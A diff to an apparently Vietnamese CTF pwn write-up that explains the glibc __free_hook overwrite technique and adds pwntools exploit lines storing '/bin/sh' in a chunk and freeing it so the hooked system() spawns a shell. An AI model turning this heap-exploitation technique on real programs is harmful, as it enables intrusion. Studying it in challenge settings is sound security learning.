@@ -173,7 +173,13 @@ sa(b"Content: ", p64(libc.sym['system']))
 
 - `__free_hook` được thiết lập, thì hàm free() sẽ trước tiên kiểm tra xem **free_hook có khác NULL hay không. Nếu **free_hook khác NULL, thay vì thực hiện việc giải phóng chunk trên heap, hàm free() sẽ gọi hàm được chỉ định bởi \_\_free_hook để xử lý việc giải phóng chunk
 - Khi này, ta free() (option 3) thì free() thay vì giải phóng mà thực hiện hàm `__free_hook` chỉ định
-
+```python
+sla(b"> ", b"1")
+sla(b"Size: ", str(0x20))
+sa(b"Content: ", b"/bin/sh\0")
+sla(b"> ", b"3")
+```
+## Kết quả 
 ```python
 
 sla(b"> ", b"1")
